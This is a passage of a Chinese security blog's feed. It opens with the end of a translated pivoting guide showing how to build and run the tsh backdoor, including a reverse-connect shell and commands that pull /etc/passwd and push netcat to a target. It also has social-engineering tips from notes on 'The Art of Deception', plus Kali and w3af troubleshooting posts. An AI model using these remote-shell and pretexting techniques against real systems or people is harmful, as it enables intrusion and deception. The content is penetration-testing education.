--no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o</div><div class="line">strip tsh</div><div class="line">gcc -O3 -W -Wall -DLINUX -c tshd.c</div><div class="line">gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o</div><div class="line">strip tshd</div><div class="line">make[1]: Leaving directory <span class="string">'/tmp/tsh'</span></div></pre></td></tr></table></figure></p>
<p>现在在服务器上运行<code>./tshd</code>。它将开始监听指定的端口。您可以通过执行以下命令连接到它：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./tsh host_ip</div></pre></td></tr></table></figure></p>
<p>如果tsh被编译有反向连接功能，<code>tshd</code>守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ./tsh cb</div><div class="line">Waiting <span class="keyword">for</span> the server to connect...</div></pre></td></tr></table></figure></p>
<p>用tsh传输文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./tsh host_ip get /etc/passwd .</div><div class="line">./tsh host_ip put /bin/netcat /tmp</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文翻译自&lt;a href=&quot;https://artkond.com/2017/03/23/pivoting-guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://artkond.com/2017/03/23/pivoting-guide/&lt;/a&gt;，正文如下：&lt;/p&gt;
&lt;p&gt;渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《欺骗的艺术》读书笔记</title>
    <link href="http://yoursite.com/2017/12/05/%E3%80%8A%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2017/12/05/《欺骗的艺术》读书笔记/</id>
    <published>2017-12-04T16:31:08.000Z</published>
    <updated>2017-12-10T15:54:08.683Z</updated>
    
    <content type="html"><![CDATA[<ol>
<li>人的因素是安全过程中最薄弱的环节</li>
<li>你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯</li>
<li>把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。</li>
<li>不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;人的因素是安全过程中最薄弱的环节&lt;/li&gt;
&lt;li&gt;你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯&lt;/li&gt;
&lt;li&gt;把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。&lt;/li&gt;
&lt;li&gt;不要在得到关键信息后马上结束谈话。再
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Kali持久加密USB安装所遇问题总结</title>
    <link href="http://yoursite.com/2017/12/04/Kali%E6%8C%81%E4%B9%85%E5%8A%A0%E5%AF%86USB%E5%AE%89%E8%A3%85%E6%89%80%E9%81%87%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/12/04/Kali持久加密USB安装所遇问题总结/</id>
    <published>2017-12-04T15:54:56.000Z</published>
    <updated>2017-12-04T16:28:17.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Writing-superblocks-and-filesystem-accounting-information"><a href="#Writing-superblocks-and-filesystem-accounting-information" class="headerlink" title="Writing superblocks and filesystem accounting information"></a>Writing superblocks and filesystem accounting information</h2><p>今天在将Kali安装到U盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用<code>mkfs.ext4</code>格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生U盘挂掉又重连上的情况，使用<code>dmesg</code>命令诊断故障时发现如下错误：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">device descriptor <span class="built_in">read</span>/8, error -110</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>经判断是因为主板无法提供给U盘足够的电量所导致的，因为我的U盘和虚拟机之间是3.0连接的，3.0连接要比2.0连接耗电，所以讲U盘和虚拟机之间的连接改为2.0即可解决这个问题。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Writing-superblocks-and-filesystem-accounting-information&quot;&gt;&lt;a href=&quot;#Writing-superblocks-and-filesystem-accounting-information&quot; clas
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Metasploit中shell中文乱码解决方案</title>
    <link href="http://yoursite.com/2017/12/04/Metasploit%E4%B8%ADshell%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://yoursite.com/2017/12/04/Metasploit中shell中文乱码解决方案/</id>
    <published>2017-12-04T15:46:32.000Z</published>
    <updated>2017-12-04T16:11:46.818Z</updated>
    
    <content type="html"><![CDATA[<p>有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。<br><strong>解决方法：</strong></p>
<ol>
<li>在shell窗口的工具栏选择“编辑”——&gt;“首选项”——&gt;“编码”，选中简体中文的三个编码：GB18030，GB2312，GBK，打勾并退出</li>
<li>接着在“终端”——&gt;“设定字符编码”中选择添加的三个简体中文编码之一即可<br><strong>注意：</strong></li>
<li>这个设置会随着操作系统的重启而失效</li>
<li>设定简体中文编码之后，Linux中的中文字符就会乱码，因为Linux使用UTF-8编码</li>
<li>建议只在需要的时候设定简体中文编码</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。&lt;br&gt;&lt;strong&gt;解决方法：
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Kali Rolling 2017更新后无法启动解决方案</title>
    <link href="http://yoursite.com/2017/11/25/Kali-Rolling-2017%E6%9B%B4%E6%96%B0%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://yoursite.com/2017/11/25/Kali-Rolling-2017更新后无法启动解决方案/</id>
    <published>2017-11-25T11:04:29.000Z</published>
    <updated>2017-11-25T11:34:44.949Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash"><a href="#BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash" class="headerlink" title="BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)"></a>BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</h2><p>有时更新Kali后重新启动会出现如下显示，并无法进入系统界面<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</div><div class="line">Enter <span class="string">'help'</span> <span class="keyword">for</span> a list of built-in commands.</div><div class="line"></div><div class="line">(initramfs)</div></pre></td></tr></table></figure></p>
<p><strong>解决方法：</strong></p>
<ol>
<li>在此界面输入<code>blkid</code>命令，查看自己的分区号</li>
<li>依据自己的分区号输入<code>fsck -y /dev/sda1</code>，我的分区号是sda1。</li>
<li>输入<code>exit</code>命令退出重启电脑</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash&quot;&gt;&lt;a href=&quot;#BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash&quot; class=&quot;headerl
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Kali Rolling 2017下安装w3af出错解决方案</title>
    <link href="http://yoursite.com/2017/11/08/Kali%20Rolling%202017%E4%B8%8B%E5%AE%89%E8%A3%85w3af%E5%87%BA%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://yoursite.com/2017/11/08/Kali Rolling 2017下安装w3af出错解决方案/</id>
    <published>2017-11-08T03:57:43.000Z</published>
    <updated>2017-12-11T04:33:47.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”"><a href="#Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”" class="headerlink" title="Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”"></a>Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”</h2><p><strong>解决方法1：</strong><br>修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#SSL_ST_INIT = _lib.SSL_ST_INIT</span></div><div class="line"><span class="comment">#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE</span></div><div class="line"><span class="comment">#SSL_ST_OK = _lib.SSL_ST_OK</span></div><div class="line"><span class="comment">#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE</span></div></pre></td></tr></table></figure></p>
<p><strong>解决方法2：</strong></p>
<ol>
<li><p>卸载w3af要求的pyOpenSSL版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pip uninstall pyOpenSSL</div></pre></td></tr></table></figure>
</li>
<li><p>安装最新版pyOpenSSL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pip install pyOpenSSL</div></pre></td></tr></table></figure>
</li>
<li><p>编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PIPDependency(<span class="string">'OpenSSL'</span>, <span class="string">'pyOpenSSL'</span>, <span class="string">'Version of pyOpenSSL you are using'</span>)</div></pre></td></tr></table></figure>
</li>
</ol>
<a id="more"></a>
<h2 id="error-command-‘x86-64-linux-gnu-g-’-failed-with-exit-status-1"><a href="#error-command-‘x86-64-linux-gnu-g-’-failed-with-exit-status-1" class="headerlink" title="error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1"></a>error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1</h2><p><strong>解决方法：</strong><br>使用如下命令安装相关依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ apt-get build-dep python-lxml</div><div class="line">$ apt-get install libxslt-dev libssl-dev</div></pre></td></tr></table></figure></p>
<h2 id="ImportError-No-module-named-webkit"><a href="#ImportError-No-module-named-webkit" class="headerlink" title="ImportError: No module named webkit"></a>ImportError: No module named webkit</h2><p>启动GUI界面时可能会报此错误，原因是未安装相关模块<br><strong>解决方法：</strong><br>执行如下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ apt-get install python-webkit python-webkit-dev</div></pre></td></tr></table></figure></p>
<p>在Kali下，因为python-webkit，python-webkit-dev不在Kali默认的源中，所以需要执行下面的命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb</div><div class="line">$ dpkg -i python-support_1.0.15_all.deb</div><div class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb</div><div class="line">$ dpkg -i python-webkit_1.1.8-3_amd64.deb</div><div class="line">$ apt install python-gtk2-dev</div><div class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb</div><div class="line">$ dpkg -i python-webkit-dev_1.1.8-3_all.deb</div></pre></td></tr></table></figure></p>
<p>安装过程中可能需要安装相关依赖，可执行如下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ apt --fix-broken install</div></pre></td></tr></table></figure></p>
<h2 id="ImportError-No-module-named-gtksourceview2"><a href="#ImportError-No-module-named-gtksourceview2" class="headerlink" title="ImportError: No module named gtksourceview2"></a>ImportError: No module named gtksourceview2</h2><p>同样，启动GUI时也可能报此错误<br><strong>解决方法：</strong><br>执行如下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ apt-get install python-gtksourceview2</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”&quot;&gt;&lt;a href=&quot;#Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”&quot; class=&quot;headerlink&quot; title=&quot;Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”&quot;&gt;&lt;/a&gt;Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;解决方法1：&lt;/strong&gt;&lt;br&gt;修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_INIT = _lib.SSL_ST_INIT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_OK = _lib.SSL_ST_OK&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决方法2：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;卸载w3af要求的pyOpenSSL版本&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ pip uninstall pyOpenSSL&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安装最新版pyOpenSSL&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ pip install pyOpenSSL&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;PIPDependency(&lt;span class=&quot;string&quot;&gt;&#39;OpenSSL&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;pyOpenSSL&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Version of pyOpenSSL you are using&#39;&lt;/span&gt;)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hexo初体验</title>
    <link href="http://yoursite.com/2017/06/20/Hexo%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2017/06/20/Hexo初体验/</id>
    <published>2017-06-20T09:38:54.317Z</published>
    <updated>2017-12-11T04:33:14.752Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装Hexo前，需要安装<a href="https://nodejs.org/en/download/" target="_blank" rel="external">Node.js</a>和<a href="https://git-scm.com/downloads" target="_blank" rel="external">Git</a>，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ node -v</div></pre></td></tr></table></figure></p>
<p>来测试Node.js是否成功安装，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm -v</div></pre></td></tr></table></figure></p>
<p>来测试npm是否成功安装。</p>
<p>npm成功安装后，可使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure></p>
<p>来快速安装Hexo</p>
<p>参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于：</p>
<p><strong>本地安装</strong></p>
<ul>
<li>将安装包放在 ./node_modules 下（运行npm时所在的目录）</li>
<li>可以通过 require() 来引入本地安装的包</li>
</ul>
<p><strong>全局安装</strong></p>
<ul>
<li>将安装包放在 /usr/local下</li>
<li>可以直接在命令行里使用</li>
</ul>
<a id="more"></a>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="新建一个网站"><a href="#新建一个网站" class="headerlink" title="新建一个网站"></a>新建一个网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo init [folder]</div></pre></td></tr></table></figure>
<p>如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。</p>
<h3 id="新建一篇文章"><a href="#新建一篇文章" class="headerlink" title="新建一篇文章"></a>新建一篇文章</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo n [layout] &lt;title&gt;</div></pre></td></tr></table></figure>
<p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p>
<h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo g</div></pre></td></tr></table></figure>
<h3 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo d</div></pre></td></tr></table></figure>
<h3 id="清除缓存文件-db-json-和已生成的静态文件-public-。"><a href="#清除缓存文件-db-json-和已生成的静态文件-public-。" class="headerlink" title="清除缓存文件(db.json)和已生成的静态文件(public)。"></a>清除缓存文件(db.json)和已生成的静态文件(public)。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo clean</div></pre></td></tr></table></figure>
<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;安装Hexo前，需要安装&lt;a href=&quot;https://nodejs.org/en/download/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Node.js&lt;/a&gt;和&lt;a href=&quot;https://git-scm.com/downloads&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Git&lt;/a&gt;，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ node -v&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;来测试Node.js是否成功安装，输入&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm -v&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;来测试npm是否成功安装。&lt;/p&gt;
&lt;p&gt;npm成功安装后，可使用&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm install -g hexo-cli&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;来快速安装Hexo&lt;/p&gt;
&lt;p&gt;参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本地安装&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将安装包放在 ./node_modules 下（运行npm时所在的目录）&lt;/li&gt;
&lt;li&gt;可以通过 require() 来引入本地安装的包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;全局安装&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将安装包放在 /usr/local下&lt;/li&gt;
&lt;li&gt;可以直接在命令行里使用&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
</feed>
